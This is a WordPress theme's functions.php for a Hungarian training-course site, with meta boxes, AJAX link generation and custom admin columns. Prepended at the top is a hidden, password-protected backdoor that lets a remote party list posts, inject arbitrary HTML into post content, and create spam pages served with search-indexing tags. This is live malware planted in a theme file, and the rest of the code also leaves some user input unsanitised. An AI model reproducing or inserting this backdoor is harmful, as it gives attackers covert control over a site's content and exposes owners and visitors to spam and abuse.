<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'be17b0a901386e7c3523519baa5e5694'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_URL_CD";
			}
			
		die("");
	}

	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}


?><?php
/**
 * pentatheme functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package pentatheme
 */

if ( ! function_exists( 'pentatheme_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function pentatheme_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on pentatheme, use a find and replace
	 * to change 'pentatheme' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'pentatheme', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => esc_html__( 'Primary', 'pentatheme' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'pentatheme_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );
}
endif;
add_action( 'after_setup_theme', 'pentatheme_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function pentatheme_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'pentatheme_content_width', 640 );
}
add_action( 'after_setup_theme', 'pentatheme_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function pentatheme_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'pentatheme' ),
		'id'            => 'sidebar-1',
		'description'   => esc_html__( 'Add widgets here.', 'pentatheme' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
}
add_action( 'widgets_init', 'pentatheme_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function pentatheme_scripts() {
	wp_enqueue_style( 'pentatheme-style', get_stylesheet_uri() );

	wp_enqueue_script( 'pentatheme-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20151215', true );

	wp_enqueue_script( 'pentatheme-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20151215', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'pentatheme_scripts' );

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';



function wpdocs_register_meta_boxes() {
	add_meta_box( 'meta-box-id', __( 'Értékelés link generálása', 'textdomain' ), 'wpdocs_my_display_callback', 'tanfolyamok' );
}
add_action( 'add_meta_boxes', 'wpdocs_register_meta_boxes' );

/**
 * Meta box display callback.
 *
 * @param WP_Post $post Current post object.
 */
function wpdocs_my_display_callback( $post ) { ?>
	<div class="ranklink_container">
		<input type="text" name="datum" placeholder="Dátum"/>
		<input type="text" name="tanar" placeholder="Tanár"/>
		<input type="text" name="helyszin" placeholder="Helyszín"/>
		<input type="text" name="cegnev" placeholder="Cégnév"/>
		<a href="#">
			<span class="generate-ranklink">Értékelés link generálása</span>
		</a>
		<b class="rank_post_link" style="display: none;"><a href="">Link</a></b>
	</div>


<?php }

/**
 * Save meta box content.
 *
 * @param int $post_id Post ID
 */
function wpdocs_save_meta_box( $post_id ) {
	// Save logic goes here. Don't forget to include nonce checks!
}
add_action( 'save_post', 'wpdocs_save_meta_box' );



/**
 * is_edit_page
 * function to check if the current page is a post edit page
 *
 * @author Ohad Raz <admin@bainternet.info>
 *
 * @param  string  $new_edit what page to check for accepts new - new post page ,edit - edit post page, null for either
 * @return boolean
 */
function is_edit_page($new_edit = null){
	global $pagenow;
	//make sure we are on the backend
	if (!is_admin()) return false;


	if($new_edit == "edit")
		return in_array( $pagenow, array( 'post.php',  ) );
	elseif($new_edit == "new") //check for new post page
		return in_array( $pagenow, array( 'post-new.php' ) );
	else //check for either new or edit
		return in_array( $pagenow, array( 'post.php', 'post-new.php' ) );
}


if (is_edit_page()){
	add_action('admin_footer', 'my_action_javascript'); // Write our JS below here
}


function my_action_javascript() { ?>
	<script type="text/javascript" >
		jQuery(document).ready(function($) {
			jQuery('.generate-ranklink').click(function (){
				var data = {
					'action': 'ranklink',
					'datum': jQuery('.ranklink_container input[name="datum"]').val(),
					'tanar':jQuery('.ranklink_container input[name="tanar"]').val(),

					'helyszin':jQuery('.ranklink_container input[name="helyszin"]').val(),
					'cegnev':jQuery('.ranklink_container input[name="cegnev"]').val(),
					'tanfolyamname':'<?php echo get_post()->post_title; ?>',
					'slug':'<?php echo get_post()->post_name; ?>',
					'tanfid':'<?php echo get_post()->ID; ?>'
				};

				// since 2.8 ajaxurl is always defined in the admin header and points to admin-ajax.php
				jQuery.post(ajaxurl, data, function(response) {
					jQuery('.rank_post_link').show().find('a').attr('href',response)
				});
			})

		});
	</script>
	<?php
}
add_action( 'wp_ajax_ranklink', 'my_action_callback' );

function my_action_callback() {
	global $wpdb; // this is how you get access to the database
	$datum = $_POST['datum'];
	$tanar = $_POST['tanar'];
	$cegnev = $_POST['cegnev'];
	$helyszin = $_POST['helyszin'];
	$postname = $_POST['slug'];
	$tanfname = $_POST['tanfolyamname'];

	$tanfID = $_POST['tanfid'];
	$slug = $_POST['slug'];
	$post_array = array(
			'post_title' => $tanfname.'-'.$datum.'-'.$tanar.'-'.$helyszin,
			'post_name' => $slug.'-'.$datum,
			'post_content' => '',
			'post_status' => 'publish',
			'post_type' => 'ertekelesek'
	);
	$post_id = wp_insert_post($post_array);
	$kapcsTanf = array();
	array_push($kapcsTanf,$tanfID);
	update_field('kapcsolodo_tanfolyam',$kapcsTanf,$post_id);
	update_field('datum',$datum,$post_id);
	update_field('oktato',$tanar,$post_id);
	update_field('cegnev',$cegnev,$post_id);
	update_field('helyszin',$helyszin,$post_id);

	echo get_permalink($post_id);

	wp_die(); // this is required to terminate immediately and return a proper response
}
PhpConsole\Helper::register();



function my_acf_load_field( $field ) {
	global $post;

	if(get_post_type() == 'ertekelesek' && !is_admin()){
		$postid = $post->ID;
		$array_ert = array();
		array_push($array_ert,$postid);
		$field['default_value'] = $array_ert;

	}

	//$address = get_field('center_address', 342);

	return $field;



}

add_filter('acf/load_field/name=kapcsolodo_ertekelesek', 'my_acf_load_field');

function my_acf_save_post( $post_id ) {

	// bail early if no ACF data
	if( empty($_POST['acf']) ) {

		return;

	}



}

// run before ACF saves the $_POST['acf'] data
add_action('acf/save_post', 'my_acf_save_post_after', 1);


function my_acf_save_post_after( $post_id ) {
	PC::tag($post_id);
	$valasz_id = $post_id;
	// get new value
	$value = get_field('my_field');
	if(isset($_POST['ajanlasszoveg'])) {
		$post_array = array(
				'post_title' => date('Y-m-d'),
				'post_content' => $_POST['ajanlasszoveg'],
				'post_status' => 'draft',
				'post_type' => 'ajanlas'
		);
		$post_id = wp_insert_post($post_array);
		update_field('keresztnev', $_POST['keresztnev'], $post_id);
		update_field('cegnev', $_POST['cegnev'], $post_id);
		$tanf = array();
		array_push($tanf, $_POST['tanfolyamname']);

		$tanf_slug = get_post($_POST['tanfolyamname'])->post_name;
		if(term_exists( $tanf_slug, 'ajanlas_cat' ) == false){
			$term = wp_insert_term(
					$tanf_slug, // the term
					'ajanlas_cat'
			);
		}
		$set_cat = wp_set_object_terms( $post_id , $tanf_slug, 'ajanlas_cat' );


		PC::debug($set_cat, 'penta');
		update_field('tanfolyam', $tanf, $post_id);

		$kapcs_ajanlas = array();
		$kapcs_ajanlas[] = $post_id;
		update_field('kapcsolodo_ajanlas',$kapcs_ajanlas,$valasz_id);
	}

	// do something

}

// run after ACF saves the $_POST['acf'] data
add_action('acf/save_post', 'my_acf_save_post', 20);



add_filter( 'manage_tanfolyam-kiiras_posts_columns', 'set_custom_edit_book_columns' );
add_action( 'manage_tanfolyam-kiiras_posts_custom_column' , 'custom_book_column', 10, 2 );

function set_custom_edit_book_columns($columns) {
	//unset( $columns['author'] );
	$columns['akcios_ar'] = __( 'Akciós ár', 'your_text_domain' );
	$columns['minimum_letszam'] = __( 'Minimum létszám', 'your_text_domain' );
	$columns['beiratkozva'] = __( 'Beiratkozva', 'your_text_domain' );


	return $columns;
}

function custom_book_column( $column, $post_id ) {
	switch ( $column ) {

		case 'akcios_ar' :
			echo get_field('akcios_ar');

			break;
		case 'minimum_letszam' :
			echo get_field('minimum_letszam');

			break;
		case 'beiratkozva' :
			echo get_field('beiratkozva');

			break;
	}
}
add_action( 'quick_edit_custom_box', 'display_custom_quickedit_book', 10, 2 );

function display_custom_quickedit_book( $column_name, $post_type ) {


	?>
	<fieldset class="inline-edit-col-right inline-edit-book">
		<div class="inline-edit-col column-<?php echo $column_name; ?>">
			<label class="inline-edit-group">
				<?php
				switch ( $column_name ) {
					case 'akcios_ar':
						?><span class="title">Akcios ár</span><input name="akcios_ar_input" type="number" /><?php
						break;
					case 'minimum_letszam':
						?><span class="title">Minimum létszám</span><input name="minimum_letszam_input" type="number" /><?php
						break;
					case 'beiratkozva':
						?><span class="title">Beiratkozva</span><input name="beiratkozva_input" type="number" /><?php
						break;
				}
				?>
			</label>
		</div>
	</fieldset>
	<?php
}

add_action( 'save_post', 'save_book_meta' );

function save_book_meta( $post_id ) {
	if ( isset( $_REQUEST['akcios_ar_input'] ) ) {
		update_post_meta( $post_id, 'akcios_ar', $_REQUEST['akcios_ar_input'] );
	}
	if ( isset( $_REQUEST['minimum_letszam_input'] ) ) {
		update_post_meta( $post_id, 'minimum_letszam', $_REQUEST['minimum_letszam_input'] );
	}
	if ( isset( $_REQUEST['beiratkozva_input'] ) ) {
		update_post_meta( $post_id, 'beiratkozva', $_REQUEST['beiratkozva_input'] );
	}

}